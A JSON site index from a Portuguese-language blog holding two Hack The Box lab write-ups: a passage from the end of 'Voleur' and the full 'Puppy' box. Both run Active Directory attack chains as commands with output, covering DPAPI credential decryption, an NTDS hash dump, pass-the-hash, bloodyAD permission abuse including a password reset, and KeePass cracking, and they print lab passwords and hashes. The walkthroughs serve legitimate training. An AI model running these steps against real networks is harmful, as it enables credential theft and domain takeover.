Users\\todd.wolfe\\AppData\\Roaming\\Microsoft\\Credentials\\772275FAD58525253490A9B0039791D3\u0026#34; -Encoding Byte -Raw)) Com os dois arquivos baixados e decodificados de volta do base64, podemos descriptografa-los com o dpapi.py. Para isso usaremos o seguinte comando:\n# CHAVE \u0026gt; dpapi.py masterkey -file chave -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password \u0026#39;NightT1meP1dg3on14\u0026#39; Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies [MASTERKEYFILE] Version : 2 (2) Guid : 08949382-134f-4c63-b93c-ce52efc0aa88 Flags : 0 (0) Policy : 0 (0) MasterKeyLen: 00000088 (136) BackupKeyLen: 00000068 (104) CredHistLen : 00000000 (0) DomainKeyLen: 00000174 (372) Decrypted key with User Key (MD4 protected) Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83 # DADOS \u0026gt; dpapi.py credential -file dados -key \u0026#39;0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83\u0026#39; Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies [CREDENTIAL] LastWritten : 2025-01-29 12:55:19+00:00 Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH) Persist : 0x00000003 (CRED_PERSIST_ENTERPRISE) Type : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD) Target : Domain:target=Jezzas_Account Description : Unknown : Username : jeremy.combs Unknown : qT3V9pLXyN7W4m Com isso conseguimos a senha do JEREMY.COMBS e consequentemente o ticket TGT dele.\nObtendo a chave do SSH e obtendo a hash do Administrator # Com a conta do JEREMY.COMBS, temos acesso a pasta Third-Line Support na share IT:\n\u0026gt; smbclient //dc.voleur.htb/IT --use-kerberos=required --use-krb5-ccache=/tmp/krb5cc_0 Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Wed Jan 29 06:10:01 2025 .. DHS 0 Mon Jun 30 18:08:33 2025 Third-Line Support D 0 Thu Jan 30 13:11:29 2025 5311743 blocks of size 4096. 885469 blocks available smb: \\\u0026gt; cd \u0026#34;Third-Line Support\u0026#34; smb: \\Third-Line Support\\\u0026gt; ls . D 0 Thu Jan 30 13:11:29 2025 .. D 0 Wed Jan 29 06:10:01 2025 id_rsa A 2602 Thu Jan 30 13:10:54 2025 Note.txt.txt A 186 Thu Jan 30 13:07:35 2025 5311743 blocks of size 4096. 885469 blocks available smb: \\Third-Line Support\\\u0026gt; Aqui encontramos uma chave SSH e uma nota escrito:\nJeremy,\nI\u0026rsquo;ve had enough of Windows Backup! I\u0026rsquo;ve part configured WSL to see if we can utilize any of the backup tools from Linux. Please see what you can set up.\nThanks,\nAdmin\nResumidamente, essa chave é usada na porta 2222 que descobrimos la no inicio, ela é do usuário SVC_BACKUP (descobrimos isso anteriormente no arquivo XLSX) e possui acesso a pasta backup da IT.\nUsando a chave para logar no SSH:\n\u0026gt; ssh voleur.htb -l svc_backup -p 2222 -i id_rsa Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Wed Jul 9 01:57:21 PDT 2025 System load: 0.52 Processes: 9 Usage of /home: unknown Users logged in: 0 Memory usage: 33% IPv4 address for eth0: 10.129.102.81 Swap usage: 0% 363 updates can be installed immediately. 257 of these updates are security updates. To see these additional updates run: apt list --upgradable The list of available updates is more than a week old. To check for new updates run: sudo apt update Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1 * Starting OpenBSD Secure Shell server sshd [ OK ] svc_backup@DC:~$ Usando o comando sudo -l, vemos que temos permissões completas, então apenas usando sudo su conseguimos root na máquina Linux:\n\u0026gt; svc_backup@DC:/$ sudo -l Matching Defaults entries for svc_backup on DC: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User svc_backup may run the following commands on DC: (ALL : ALL) ALL (ALL) NOPASSWD: ALL \u0026gt; svc_backup@DC:/$ sudo su root@DC:/# Analisando as pastas do /mnt, vemos que na pasta: /mnt/c/IT/Third-Line Support/Backups existe um backup do SAM/LSA, podemos baixar localmente e extrair as hashs usando o secretsdump.py. Para baixar a pasta irei usar o scp:\n\u0026gt; scp -i id_rsa -P 2222 -r svc_backup@voleur.htb:/mnt/c/IT/Third-Line\\ Support/Backups/ ./ ntds.dit 100% 24MB 2.3MB/s 00:10 ntds.jfm 100% 16KB 36.5KB/s 00:00 SECURITY 100% 32KB 73.2KB/s 00:00 SYSTEM 100% 18MB 2.1MB/s 00:08 E utilizando o secretsdump.py localmente, extraimos as hashs e solicitamos o TGT do Administrator:\n\u0026gt; secretsdump -ntds \u0026#34;Active Directory/ntds.dit\u0026#34; -system \u0026#34;registry/SYSTEM\u0026#34; -security \u0026#34;Pregistry/SECURITY\u0026#34; LOCAL Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d [-] LSA hashes extraction failed: [Errno 2] No such file or directory: \u0026#39;Pregistry/SECURITY\u0026#39; [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40 [*] Reading and decrypting hashes from Active Directory/ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c::: voleur.htb\\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16::: voleur.htb\\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8::: voleur.htb\\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3::: voleur.htb\\**SVC_LDAP**:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307::: voleur.htb\\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573::: voleur.htb\\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410::: voleur.htb\\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c::: voleur.htb\\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421::: [*] Kerberos keys from Active Directory/ntds.dit Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc Administrator:des-cbc-md5:459d836b9edcd6b0 DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7 DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782 DC$:des-cbc-md5:64e05b6d1abff1c8 krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145 krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211 krbtgt:des-cbc-md5:34ae31d073f86d20 voleur.htb\\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74 voleur.htb\\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1 voleur.htb\\ryan.naylor:des-cbc-md5:4376f7917a197a5b voleur.htb\\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d voleur.htb\\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f voleur.htb\\marie.bryant:des-cbc-md5:cdf1492604d3a220 voleur.htb\\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9 voleur.htb\\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066 voleur.htb\\lacey.miller:des-cbc-md5:6eef922076ba7675 voleur.htb\\**SVC_LDAP**:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910 voleur.htb\\**SVC_LDAP**:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f voleur.htb\\**SVC_LDAP**:des-cbc-md5:1ab0fbfeeaef5776 voleur.htb\\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f voleur.htb\\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd voleur.htb\\svc_backup:des-cbc-md5:7ab513f8ab7f765e voleur.htb\\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258 voleur.htb\\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395 voleur.htb\\svc_iis:des-cbc-md5:70ce25431c577f92 voleur.htb\\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0 voleur.htb\\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27 voleur.htb\\jeremy.combs:des-cbc-md5:192f702abff75257 voleur.htb\\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114 voleur.htb\\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831 voleur.htb\\svc_winrm:des-cbc-md5:32b61fb92a7010ab [*] Cleaning up... \u0026gt; getTGT.py voleur.htb/Administrator -hashes aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2 Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in Administrator.ccache \u0026gt; export KRB5CCNAME=Administrator.ccache \u0026gt; evil-winrm -i \u0026#34;dc.voleur.htb\u0026#34; -r VOLEUR.HTB Evil-WinRM shell v3.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\Administrator\\Documents\u0026gt; E com isso conseguimos a flag root e finalizamos a máquina:\n*Evil-WinRM* PS C:\\Users\\Administrator\\Desktop\u0026gt; cat root.txt 654471a5001da42030fd1869f97c041d ","date":"30 outubro 2025","externalUrl":null,"permalink":"/CatOverflow/writeups/voleur-htb/","section":"Writeups","summary":"As is common in real life Windows pentests, you will start the Voleur box with credentials for the following account: ryan.naylor / HollowOct31Nyt","title":"Voleur - HTB","type":"writeups"},{"content":" Resumo # A Puppy é uma máquina de nível Medium focada em Windows/Active Directory (AD). Apesar de ser nível Medium ela é uma máquina bastante simples e ótima para iniciantes. Nela abusamos de uma permissão de GenericWrite em um grupo do AD que nos garante acesso a uma share contendo um database do software KeePass. Brutando esse database conseguimos as senhas de vários usuários e um deles nos dá acesso a outra permissão de GenericAll em cima de outro usuário, permitindo assim mudar a senha dele e obter acesso remoto. Após obtermos acesso encontramos um arquivo de backup contendo a senha de outro usuário e por fim, obtemos acesso ao Administrator por meio do dump de DPAPI.\nUser Flag # Como descrito na descrição da box, ja iniciamos com um usuário e senha: levi.james / KingofAkron2025!, usaremos ele para iniciar o recon e entender o que temos de disponivel para utilizar.\nEstarei utilizando o Rustscan para realizar a enumeração inicial para encontrar portas abertas e o nome do AD/DOMAIN:\nrustscan -a 10.10.11.70 -u 5000 -- -sV Resultados:\nPORT STATE SERVICE REASON VERSION 53/tcp open domain syn-ack ttl 127 Simple DNS Plus 88/tcp open kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-18 03:29:03Z) 111/tcp open rpcbind syn-ack ttl 127 2-4 (RPC #100000) 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 389/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? syn-ack ttl 127 464/tcp open kpasswd5? syn-ack ttl 127 593/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped syn-ack ttl 127 2049/tcp open status syn-ack ttl 127 1 (RPC #100024) 3260/tcp open iscsi? syn-ack ttl 127 3268/tcp open ldap syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped syn-ack ttl 127 5985/tcp open http syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 49664/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49667/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49669/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 49670/tcp open ncacn_http syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0 49685/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 62647/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 62682/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows SEMPRE que rodar o Rustscan/Nmap, adicione o domain encontrado no seu arquivo /etc/hosts para não ter problemas de DNS. E SEMPRE que for possível, coloque o dc.DOMINIO.htb ANTES do DOMINIO.htb. Vemos várias portas padrões e nada interessante de cara, então partirei para a enumeração das shares do SMB (Server Message Block). Para isso estarei utilizando o NetExec:\nnxc smb PUPPY.HTB -u \u0026#39;levi.james\u0026#39; -p \u0026#39;KingofAkron2025!\u0026#39; --shares Resultados:\nSMB 10.10.11.70 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False) SMB 10.10.11.70 445 DC [+] PUPPY.HTB\\levi.james:KingofAkron2025! SMB 10.10.11.70 445 DC [*] Enumerated shares SMB 10.10.11.70 445 DC Share Permissions Remark SMB 10.10.11.70 445 DC ----- ----------- ------ SMB 10.10.11.70 445 DC ADMIN$ Remote Admin SMB 10.10.11.70 445 DC C$ Default share SMB 10.10.11.70 445 DC DEV DEV-SHARE for PUPPY-DEVS SMB 10.10.11.70 445 DC IPC$ READ Remote IPC SMB 10.10.11.70 445 DC NETLOGON READ Logon server share SMB 10.10.11.70 445 DC SYSVOL READ Logon server share Notamos que a share DEV é uma share fora do padrão de máquinas Windows, então ficaremos de olho nisso, porém por hora não temos acesso a ela.\nAgora o que resta é enumerar o AD completo, e para isso estarei usando o bloodhound-python:\nbloodhound-python -u \u0026#39;levi.james\u0026#39; -p \u0026#39;KingofAkron2025!\u0026#39; --zip -c ALL -ns 10.10.11.70 -d PUPPY.HTB Após o scan terminar, ele irá gerar um zip contendo todo o dump do AD, e com isso podemos \u0026ldquo;digerir\u0026rdquo; esse zip e gerar um gráfico para entender a estrutura do AD. Para isso estarei usando o BloodHound-Legacy.\nAnalises do AD # Nosso usuário faz parte de um grupo que possui a permissão GenericWrite para outro grupo chamado DEVELOPERS.\nComo vimos anteriormente, existe uma share chamada DEV que é especifica do grupo DEVELOPERS.\nContinuando a análise do AD, vimos que o usuário ADAM.SILVER possui a permissão de PSREMOTE, o que torna interessante adquirir o acesso dele, e um meio de chegar até ele é através do ANT.EDWARDS:\nVimos também outro usuário com a permissão PSREMOTE, o que também o torna interessante:\nAtacando o AD # Para iniciar o ataque, estarei abusando da permissão GenericAll que permite nós nos adicionarmos no grupo DEVELOPERS para assim, termos acesso à share DEV. Estarei utilizando o BloodyAD para esse ataque. Caso você queira realizar outras funções do bloodyAD e não tem saco para ler o help da ferramenta, te aconselho esse site.\nPara nos adicionarmos no grupo, usarei o seguinte comando:\nbloodyAD --host puppy.htb -u levi.james -p \u0026#39;KingofAkron2025!\u0026#39; -d puppy.htb bloody add groupMember DEVELOPERS levi.james Resultados:\n[+] levi.james added to DEVELOPERS Com isso ganhamos permissão de acesso na share DEV. Acessando a share com o smbclient-ng nos deparamos com o seguinte arquivo:\nsmbclient-ng -d \u0026#34;puppy.htb\u0026#34; -u \u0026#34;levi.james\u0026#34; -p \u0026#39;KingofAkron2025!\u0026#39; --host \u0026#34;puppy.htb\u0026#34; Buscando na web o que é um arquivo kdbx, vemos que:\nUm arquivo .kdbx é um banco de dados de senhas criptografado, criado e usado pelo gerenciador de senhas de código aberto, o KeePass. Ele armazena senhas e outras informações de login de forma segura, sendo acessível apenas com uma senha mestra.\nEntão, basta descobrirmos a senha usada para criptografar o database que conseguimos acesso a tudo dentro dele. Tendo isso em mente, estarei usando o keepass2john para geramos a hash para enfim, tentar o ataque de brute-force:\nkeepass2john recovery.kdbx \u0026gt; hash Resultado:\nrecovery:$keepass$*4*37*ef636ddf*67108864*19*4*bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf2662853527714*d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb92441470*03d9a29a67fb4bb500000400021000000031c1f2e6bf714350be5805216afc5aff0304000000010000000420000000bf70d9925723ccf623575d62e4c4fb590a2b2b4323ac35892cf266285352771407100000000ab56ae17c5cebf440092907dac20a350b8b00000000014205000000245555494410000000ef636ddf8c29444b91f7a9a403e30a0c05010000004908000000250000000000000005010000004d080000000000000400000000040100000050040000000400000042010000005320000000d421b15d6c79e29ecb70c8e1c2e92b4b27dc8d9ae6d8107292057feb9244147004010000005604000000130000000000040000000d0a0d0a*31614848015626f2451cc4d07ce9a281a416c8e8c2ff8cc45c69ce1f4daef0e9 Utilizando o john para quebrar:\njohn --wordlist=\u0026#34;/usr/share/wordlists/rockyou.txt\u0026#34; hash Recebemos a seguinte senha:\nUsing default input encoding: UTF-8 Loaded 1 password hash (KeePass [AES/Argon2 128/128 SSE2]) Cost 1 (t (rounds)) is 37 for all loaded hashes Cost 2 (m) is 65536 for all loaded hashes Cost 3 (p) is 4 for all loaded hashes Cost 4 (KDF [0=Argon2d 2=Argon2id 3=AES]) is 0 for all loaded hashes Will run 4 OpenMP threads Note: Passwords longer than 41 [worst case UTF-8] to 124 [ASCII] rejected Press \u0026#39;q\u0026#39; or Ctrl-C to abort, \u0026#39;h\u0026#39; for help, almost any other key for status **liverpool (recovery)** 1g 0:00:00:32 DONE (2025-05-18 01:13) 0.03088g/s 1.112p/s 1.112c/s 1.112C/s purple..liverpool Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Obtendo o usuário ANT.EDWARDS # Utilizando a ferramenta kpcli e a senha adquirida, conseguimos dumpar os dados do arquivo:\nPara essa ferramenta rodar corretamente, é preciso exportar o arquivo do database para ele conseguir \u0026ldquo;encontrar\u0026rdquo; ele. Para fazer isso só é preciso adicionar KEEPASSDB=recovery.kdbx antes do comando da ferramenta. \u0026gt; KEEPASSDB=recovery.kdbx kpcli ls Database: recovery.kdbx UNLOCKING... Database password: ================================================================================ Groups ================================================================================ Root \u0026gt; KEEPASSDB=recovery.kdbx kpcli ls --group Root --entries Database: recovery.kdbx UNLOCKING... Database password: ================================================================================ Root ================================================================================ ADAM SILVER ANTONY C. EDWARDS JAMIE WILLIAMSON SAMUEL BLAKE STEVE TUCKER Utilizando a função cp, a senha é copiada para o clipboard:\n\u0026gt; KEEPASSDB=recovery.kdbx kpcli cp Root/\u0026#39;ANTONY C. EDWARDS\u0026#39; password Com isso, conseguimos a senha do ANT.EDWARDS: Antman2025!\nObtendo o usuário ADAM.SILVER # Como vimos anteriormente, o usuário ANT.EDWARDS possui GenericAll sobre o user ADAM.SILVER. Podemos abusar disso e alterar a senha do ADAM. Novamente estarei usando o BloodyAD:\nbloodyAD --host puppy.htb -u ant.edwards -p \u0026#39;Antman2025!\u0026#39; set password adam.silver \u0026#39;Password123!\u0026#39; Porém, se analisarmos o node do ADAM.SILVER, vemos que esse usuário está desabilitado:\nPara habilitar ele, irei usar novamente o bloodyAD:\nbloodyAD --host puppy.htb -u ant.edwards -p \u0026#39;Antman2025!\u0026#39; remove uac adam.silver -f ACCOUNTDISABLE Resultado:\n[-] [\u0026#39;ACCOUNTDISABLE\u0026#39;] property flags removed from adam.silver\u0026#39;s userAccountControl E por fim, conseguimos logar no PowerShell com o usuário ADAM.SILVER utilizando o Evil-Winrm:\nRoot Flag # Obtendo o usuário STEPH.COOPER # Explorando os arquivos da máquina, encontramos um arquivo de backup na pasta C:\\Backups:\nBaixando o arquivo, extraindo e analisando ele, encontramos a senha do usuário STEPH.COOPER:\nCom isso podemos logar no usuário STEPH.COOPER usando o Evil-Winrm:\nObtendo o usuário Administrator # Analisando as pastas do STEPH.COOPER, encontramos um arquivo .lnk do Microsoft Edge na Desktop dele:\nIsso não é muito normal em CTFs Windows, normalmente quanto existe um arquivo .lnk em uma máquina de CTF, significa que um browser foi utilizado por esse usuário.\nSeguindo o post do The Hackers Recipe a respeito de DPAPI secrets, podemos extrair as senhas salvas utilizando o DPAPI (Data Protection API), que é um componente interno nos sistemas Windows.\nO DPAPI permite que aplicações armazenem dados sensíveis. Esses dados são armazenados nos diretórios dos usuários e são guardadas por chaves mestras especificas do usuário, derivadas da senha deles. Para decriptografar esses dados, precisamos da senha do usuário e da master key.\nA master key criptografada se encontra no diretório:\nC:\\Users\\$USER\\AppData\\Roaming\\Microsoft\\Protect\\$SUID\\$GUID Alguns diretórios que contém dados escondidos protegidos pelo DPAPI são:\nC:\\Users\\$USER\\AppData\\Local\\Microsoft\\Credentials\\ C:\\Users\\$USER\\AppData\\Roaming\\Microsoft\\Credentials\\ Para dumpar a master key criptografada, precisaremos baixar na nossa máquina. Para facilitar irei passar em base64 e decodar no meu terminal (OBS: não podemos baixar diretamente o arquivo pois não temos permissão)\n[Convert]::ToBase64String((Get-Content -Path \u0026#34;C:/Users/steph.cooper/AppData/Roaming/Microsoft/Protect/S-1-5-21-1487982659-1829050783-2281216199-1107/556a2412-1275-4ccf-b721-e6a0b4f90407\u0026#34; -Encoding byte)) Agora decodamos na nossa máquina e salvamos em um arquivo:\necho \u0026#34;AgAAAAAAAAAAAAAANQA1ADYAYQAyADQAMQAyAC0AMQAyADcANQAtADQAYwBjAGYALQBiADcAMgAxAC0AZQA2AGEAMABiADQAZgA5ADAANAAwADcAAABqVXUSz0wAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAAsj8xITRBgEgAZOArghULmlBGAAAJgAAAA2YAAPtTG5NorNzxhcfx4/jYgxj+JK0HBHMu8jL7YmpQvLiX7P3r8JgmUe6u9jRlDDjMOHDoZvKzrgIlOUbC0tm4g/4fwFIfMWBq0/fLkFUoEUWvl1/BQlIKAYfIoVXIhNRtc+KnqjXV7w+BAgAAAIIHeThOAhE+Lw/NTnPdszJQRgAACYAAAANmAAAnsQrcWYkrgMd0xLdAjCF9uEuKC2mzsDC0a8AOxgQxR93gmJxhUmVWDQ3j7+LCRX6JWd1L/NlzkmxDehild6MtoO3nd90f5dACAAAAAAEAAFgAAADzFsU+FoA2QrrPuakOpQmSSMbe5Djd8l+4J8uoHSit4+e1BHJIbO28uwtyRxl2Q7tk6e/jjlqROSxDoQUHc37jjVtn4SVdouDfm52kzZT2VheO6A0DqjDlEB19Qbzn9BTpGG4y7P8GuGyN81sbNoLN84yWe1mA15CSZPHx8frov6YwdLQEg7H8vyv9ZieGhBRwvpvp4gTur0SWGamc7WN590w8Vp98J1n3t3TF8H2otXCjnpM9m6exMiTfWpTWfN9FFiL2aC7Gzr/FamzlMQ5E5QAnk63b2T/dMJnp5oIU8cDPq+RCVRSxcdAgUOAZMxPs9Cc7BUD+ERVTMUi/Jp7MlVgK1cIeipAl/gZz5asyOJnbThLa2ylLAf0vaWZGPFQWaIRfc8ni2iVkUlgCO7bI9YDIwDyTGQw0Yz/vRE/EJvtB4bCJdW+Ecnk8TUbok3SGQoExL3I5Tm2a/F6/oscc9YlciWKEmqQ=\u0026#34; | base64 -d \u0026gt; masterkey Agora pegamos o dado criptografado do mesmo jeito:\n[Convert]::ToBase64String((Get-Content -Path \u0026#34;C:/Users/steph.cooper/AppData/Roaming/Microsoft/Credentials/C8D69EBE9A43E9DEBF6B5FBD48B521B9\u0026#34; -Encoding byte)) echo \u0026#34;AQAAAJIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAEiRqVXUSz0y3IeagtPkEBwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAAHEb7RgOmv+9Na4Okf93s5UAAAAABIAAAKAAAAAQAAAACtD/ejPwVzLZOMdWJSHNcNAAAAAxXrMDYlY3P7k8AxWLBmmyKBrAVVGhfnfVrkzLQu2ABNeu0R62bEFJ0CdfcBONlj8Jg2mtcVXXWuYPSiVDse/sOudQSf3ZGmYhCz21A8c6JCGLjWuS78fQnyLW5RVLLzZp2+6gEcSU1EsxFdHCp9cT1fHIHl0cXbIvGtfUdeIcxPq/nN5PY8TR3T8i7rw1h5fEzlCX7IFzIu0avyGPnrIDNgButIkHWX+xjrzWKXGEiGrMkbgiRvfdwFxb/XrET9Op8oGxLkI6Mr8QmFZbjS41FAAAADqxkFzw7vbQSYX1LftJiaf2waSc\u0026#34; | base64 -d \u0026gt; data Para decriptar a chave mestra, podemos utilizar o dpapi.py do Impacket:\ndpapi.py masterkey -file \u0026#34;/path/to/masterkey_file\u0026#34; -sid $USER_SID -password $MASTERKEY_PASSWORD OBS: o SID é o ID que estava no nome da pasta onde estava armazenada a master key, nesse caso é “S-1-5-21-1487982659-1829050783-2281216199-1107”. E o password é a senha do usuário.\ndpapi.py masterkey -file \u0026#34;masterkey\u0026#34; -sid \u0026#34;S-1-5-21-1487982659-1829050783-2281216199-1107\u0026#34; -password \u0026#39;ChefSteph2025!\u0026#39; Resultado:\nImpacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies [MASTERKEYFILE] Version : 2 (2) Guid : 556a2412-1275-4ccf-b721-e6a0b4f90407 Flags : 0 (0) Policy : 4ccf1275 (1288639093) MasterKeyLen: 00000088 (136) BackupKeyLen: 00000068 (104) CredHistLen : 00000000 (0) DomainKeyLen: 00000174 (372) Decrypted key with User Key (MD4 protected) Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84 Usando a chave descriptografada, podemos usar ela para descriptografar o dado obtido anteriormente:\ndpapi.py credential -file \u0026#34;/path/to/protected_file\u0026#34; -key $MASTERKEY dpapi.py credential -file data -key \u0026#34;0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84\u0026#34; Resultado:\nImpacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies [CREDENTIAL] LastWritten : 2025-03-08 15:54:29+00:00 Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH) Persist : 0x00000003 (CRED_PERSIST_ENTERPRISE) Type : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD) Target : Domain:target=PUPPY.HTB Description : Unknown : Username : steph.cooper_adm Unknown : FivethChipOnItsWay2025! Com isso adquirimos a senha do admin local. Podemos logar e pegar a root.txt.\n","date":"27 outubro 2025","externalUrl":null,"permalink":"/CatOverflow/writeups/puppy-htb/","section":"Writeups","summary":"As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!","title":"Puppy - HTB","type":"writeups"},{"content":"","externalUrl":null,"permalink":"/CatOverflow/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/CatOverflow/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/CatOverflow/series/","section":"Series","summary":"","title":"Series","type":"series"}]